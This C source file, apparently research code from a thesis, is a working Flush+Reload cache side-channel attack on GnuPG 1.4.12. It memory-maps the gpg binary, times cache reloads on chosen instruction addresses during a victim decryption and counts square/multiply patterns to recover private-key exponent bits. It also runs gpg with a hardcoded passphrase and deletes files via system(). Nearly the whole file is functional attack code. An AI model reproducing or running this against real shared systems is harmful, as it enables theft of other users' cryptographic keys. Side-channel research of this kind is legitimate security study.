
#define _GNU_SOURCE
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <limits.h>
#include <fcntl.h> //open
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> //close
#include <sched.h>
#include <pthread.h>
#include "../../Utils/src/assemblyinstructions.h"
#include "../../Utils/src/cachetechniques.h"
#include "../../Utils/src/fileutils.h"

#define handle_error(msg) \
	do { perror(msg); exit(EXIT_FAILURE); } while (0)

#define EXE_FILENAME "/home/root/gnupg-1.4.12/bin/gpg"

#define EXE_ADDRS_FILENAME "/home/root/thesis-code/exe_addresses.txt"

#define ANALYSIS_CSV_FILENAME "/home/root/thesis-code/static_analysis.csv"

#define MAX_ADDRS_TO_MONITOR 10

#define MAX_TIMES_TO_MONITOR_EACH_ADDRS 300000

#define GPG_MAX_SIZE_BYTES 4194304

#define THRESHOLD 45

#define DELAYFORVICTIMACTIVITY 2800

#define MAXIDLECOUNT 500

#define OUTPUTRAWDATA 1

unsigned long obtainthreshold() {
	const int MAX_TIME = 80;
	const int MAX_WITHOUT_NOISE_ARRAY = 5 * 1024;
	const int MID_ARRAY = 2 * 1024;
	unsigned int array[MAX_WITHOUT_NOISE_ARRAY];
	unsigned int hit_counts[MAX_TIME];
	unsigned int miss_counts[MAX_TIME];
	int i;

	memset(array, -1, MAX_WITHOUT_NOISE_ARRAY * sizeof(unsigned int));
	reload(array + MID_ARRAY);
	sched_yield();
	//4MB
	for (i = 0; i < 4 * 1024 * 1024; ++i) {
		unsigned long time = reload(array + MID_ARRAY) / 5;
		hit_counts[time > (MAX_TIME - 1) ? MAX_TIME - 1 : time]++;
		sched_yield();
	}

	for (i = 0; i < 4 * 1024 * 1024; ++i) {
		flush(array + MID_ARRAY);
		unsigned long time = reload(array + MID_ARRAY) / 5;
		miss_counts[time > (MAX_TIME - 1) ? MAX_TIME - 1 : time]++;
		sched_yield();
	}
	unsigned int hit_max = 0;
	unsigned int hit_max_index = 0;
	unsigned int miss_min_index = 0;
	printf("TSC:           HITS           MISSES\n");
	for (i = 0; i < MAX_TIME; ++i) {
		printf("%3d: %10zu %10zu\n", i * 5, hit_counts[i], miss_counts[i]);
		if (hit_max < hit_counts[i]) {
			hit_max = hit_counts[i];
			hit_max_index = i;
		}
		if (miss_counts[i] > 3 && miss_min_index == 0)
			miss_min_index = i;
	}
	unsigned int nr_times_threshold = -1UL;
	unsigned int threshold = 0;

	for (i = hit_max_index; i < miss_min_index; ++i) {
		if (nr_times_threshold > (hit_counts[i] + miss_counts[i])) {
			nr_times_threshold = hit_counts[i] + miss_counts[i];
			threshold = i;
		}
	}
	return threshold * 5;
}

long int getaddrstomonitor(const char* exeaddrsfilename, long int* out_addrs) {
	FILE* ptr_addrs = fopen(exeaddrsfilename, "r");
	if (ptr_addrs == NULL)
		handle_error("fopen_exeaddrsfilename");
	unsigned int linesize = 0, linelength = 0;
	char* line = malloc(256 * sizeof(char*));
	char* pEnd;
	long int nr_addrs = 0;
	int i;

	if ((linelength = getline(&line, &linesize, ptr_addrs)) <= 0)
		handle_error("getline_nr_addrs <= 0");
	line[linelength - 1] = '\0';
	nr_addrs = strtol(line, &pEnd, 10);
	if (*pEnd != '\r' && *pEnd != '\n' && *pEnd != '\0')
		handle_error("strtol_nr_addrs != \\r or \\n or \\0");

	long int addraux;

	for (i = 0; i < nr_addrs; ++i) {
		if ((linelength = getline(&line, &linesize, ptr_addrs)) <= 0)
			handle_error("getline_addrs <= 0");
		addraux = strtol(line, &pEnd, 0);
		if (*pEnd != '\r' && *pEnd != '\n' && *pEnd != '\0')
			handle_error("strtol_addrs != \\r or \\n or \\0");
		out_addrs[i] = addraux;
	}
	free(line);
	fclose(ptr_addrs);
	return nr_addrs;
}

int setcoreaffinity(int core_id) {
	int num_cores = sysconf(_SC_NPROCESSORS_ONLN);
	if (core_id < 0 || core_id >= num_cores)
		handle_error("Wrong core id");
	cpu_set_t cpuset;
	CPU_ZERO(&cpuset);
	CPU_SET(core_id, &cpuset);
	return sched_setaffinity(0, sizeof(cpu_set_t), &cpuset);
}

void delayloop(size_t cycles) {
	unsigned long long start = rdtscp();
	while ((rdtscp() - start) < cycles)
		;
}

int isvictimactive(unsigned int *analysis, int nr_addrs, int threshold) {
	int i;
	for (i = 0; i < nr_addrs; ++i) {
		if (analysis[i] < threshold)
			return 1;
	}
	return 0;
}

int missedvictimactivity(unsigned long long startcycles) {
	if (getcurrenttsc() > startcycles)
		return 1;
	while (getcurrenttsc() < startcycles)
		;
	return 0;
}

void analysealladdrs(unsigned int *out_analysis, unsigned long ptr_offset,
		long int *exe_addrs, int nr_addrs, int threshold) {
	int addrs_index;
	for (addrs_index = 0; addrs_index < nr_addrs; ++addrs_index) {
		char * aux = (char*) exe_addrs[addrs_index];
		char * ptr_to_monitor = aux + ptr_offset;
		unsigned int auxtsc = reloadandflush(ptr_to_monitor);
		if (OUTPUTRAWDATA)
			out_analysis[addrs_index] = auxtsc < UINT_MAX ? auxtsc : UINT_MAX;
		else
			out_analysis[addrs_index] = auxtsc < threshold ? 1 : 2;
	}
}

void missedalladdrs(unsigned int *out_analysis, unsigned long ptr_offset,
		long int *exe_addrs, int nr_addrs) {
	int addrs_index;
	for (addrs_index = 0; addrs_index < nr_addrs; ++addrs_index) {
		out_analysis[addrs_index] = 0;
	}
}

#define CMD_DECRYPT_STR "taskset 0x00000001 echo 1a2b3cinesc | /home/root/gnupg-1.4.12/bin/gpg --passphrase-fd 0 /home/root/gnupg-1.4.12/bin/message.txt.gpg"
#define CMD_RM_DECRYPT_STR "rm /home/root/gnupg-1.4.12/bin/*.txt"
void synchronouslyrungnupg() {
	//COMMENT WHEN ENCRYPT
	int errno = system(CMD_DECRYPT_STR);
	int errno1 = system(CMD_RM_DECRYPT_STR);
	if (errno == -1 || errno1 == -1)
		handle_error("system() running gnupg or removing files");
}

//0-square
//1-reduce
//2-multiply
void obtainmaxtimesabovethreshold(unsigned int* numberoftimesabovethreshold,
		unsigned int threshold, unsigned int rowsize, unsigned int columnsize,
		unsigned int src[][columnsize]) {
	int i, j;
	unsigned int max = 0;

	for (j = 0; j < columnsize; ++j) {
		for (i = 0; i < rowsize - 1; i++) {
			if (src[i][j] <= threshold && src[i][j] > 0) {
				++numberoftimesabovethreshold[j];
			} else {
				numberoftimesabovethreshold[j] = 0;
			}
			if (numberoftimesabovethreshold[j] > max) {
				max = numberoftimesabovethreshold[j];
			}
		}
		numberoftimesabovethreshold[j] = max;
		printf("Max times %u address: %u\n", j, max);
	}
}

void obtaindparameternumberofbits(unsigned int threshold, unsigned int rowsize,
		unsigned int columnsize, unsigned int src[][columnsize],
		unsigned int out_numberofbits[columnsize]) {
	unsigned int numberoftimesabovethreshold[columnsize];
	int i, j;
	memset(numberoftimesabovethreshold, 0, sizeof(unsigned int) * columnsize);
	memset(out_numberofbits, 0, sizeof(unsigned int) * columnsize);
	obtainmaxtimesabovethreshold(numberoftimesabovethreshold, threshold,
			rowsize, columnsize, src);

	for (j = 0; j < columnsize; ++j) {
		unsigned int numberoftimes = 0;
		for (i = 0; i < rowsize - 1; i++) {
			if (src[i][j] <= threshold && src[i][j] > 0) {
				++numberoftimes;
			} else {
				if (numberoftimes > numberoftimesabovethreshold[j] * 0.5
						&& numberoftimes <= numberoftimesabovethreshold[j]) {
					++out_numberofbits[j];
				}
				numberoftimes = 0;
			}
		}
		//printf("Number of bits of %u index address: %u\n", j, out_numberofbits[j]);
	}
}

int analysecache(int delay, long int exe_addrs[MAX_ADDRS_TO_MONITOR],
		int nr_addrs,
		unsigned int analysis_array[MAX_TIMES_TO_MONITOR_EACH_ADDRS][nr_addrs]) {
	int fd_exe;
	struct stat sbuff;
	char* mapping_addr;

	//share the executable
	fd_exe = open(EXE_FILENAME, O_RDONLY);
	if (fd_exe == -1)
		handle_error("open_exe_filename");
	if (fstat(fd_exe, &sbuff) == -1)
		handle_error("fstat");
	mapping_addr = (char*) mmap(0, GPG_MAX_SIZE_BYTES, PROT_READ, MAP_PRIVATE,
			fd_exe, 0);
	if (mapping_addr == MAP_FAILED)
		handle_error("mmap");
	printf(".exe shared\n");

	unsigned long ptr_offset = (unsigned long) mapping_addr;

	//monitor .exe addrs
	printf(".exe addrs monitor\n");

	//Begin NEW
	unsigned long long start = getcurrenttsc();
	analysealladdrs(analysis_array[0], ptr_offset, exe_addrs, nr_addrs,
	THRESHOLD);
	do {
		do {
			start += delay;
		} while (missedvictimactivity(start));
		analysealladdrs(analysis_array[0], ptr_offset, exe_addrs, nr_addrs,
		THRESHOLD);
	} while (!isvictimactive(analysis_array[0], nr_addrs,
	OUTPUTRAWDATA ? THRESHOLD : 2));

	int idle = 0, i = 1, missedactivity = 0, missrate = 0;

	for (i = 1, idle = 0;
			idle < MAXIDLECOUNT && i < MAX_TIMES_TO_MONITOR_EACH_ADDRS;
			++idle, ++i) {
		if (!missedactivity) {
			analysealladdrs(analysis_array[i], ptr_offset, exe_addrs, nr_addrs,
			THRESHOLD);
			if (isvictimactive(analysis_array[i], nr_addrs,
			OUTPUTRAWDATA ? THRESHOLD : 2))
				idle = 0;
		} else {
			missedalladdrs(analysis_array[i], ptr_offset, exe_addrs, nr_addrs);
			++missrate;
		}

		start += delay;
		missedactivity = missedvictimactivity(start);

	}
	printf(".exe results to csv file\n");
	printf("Missed samples: %d\n", missrate);
	printf("Samples: %d\n", i);
	munmap(mapping_addr, sbuff.st_size);
	close(fd_exe);
	return i;
}

void autoobtaindelay() {
	int delay, i = 0, nr_addrs;
	long int exe_addrs[MAX_ADDRS_TO_MONITOR];
	const int max_delay = 5000;

	//obtain the addrs to monitor
	nr_addrs = getaddrstomonitor(EXE_ADDRS_FILENAME, exe_addrs);
	unsigned int delay_array[max_delay][nr_addrs];

	for (delay = 600; delay < max_delay; delay += 100) {

		setcoreaffinity(0);
		unsigned int analysis_array[MAX_TIMES_TO_MONITOR_EACH_ADDRS][nr_addrs];

		//analyse LLC
		printf("Analyse Cache delay: %d\n\n", delay);
		int analysis_array_length = analysecache(delay, exe_addrs,
				nr_addrs, analysis_array);

		obtaindparameternumberofbits(THRESHOLD, analysis_array_length,
				nr_addrs, analysis_array, delay_array[i]);
		++i;
	}
	biarraytocsvwheaders(ANALYSIS_CSV_FILENAME, exe_addrs,i, nr_addrs, delay_array);

}

int main() {
//	const unsigned long long threshold = obtainthreshold();
//	printf("THRESHOLD ::: %llu\n\r", threshold);
//	const unsigned long long THRESHOLD = 45;

	setcoreaffinity(0);

//	autoobtaindelay();

	long int exe_addrs[MAX_ADDRS_TO_MONITOR];
	int nr_addrs;

	//obtain the addrs to monitor
	nr_addrs = getaddrstomonitor(EXE_ADDRS_FILENAME, exe_addrs);

	unsigned int analysis_array[MAX_TIMES_TO_MONITOR_EACH_ADDRS][nr_addrs];

	//analyse LLC
	int analysis_array_length = analysecache(DELAYFORVICTIMACTIVITY, exe_addrs,
			nr_addrs, analysis_array);

	//results to csv file
	biarraytocsvwheaders(ANALYSIS_CSV_FILENAME, exe_addrs,
			analysis_array_length, nr_addrs, analysis_array);

	unsigned int out_numberofbits[nr_addrs];
	obtaindparameternumberofbits(THRESHOLD, analysis_array_length, nr_addrs,
			analysis_array, out_numberofbits);

	return 0;
}
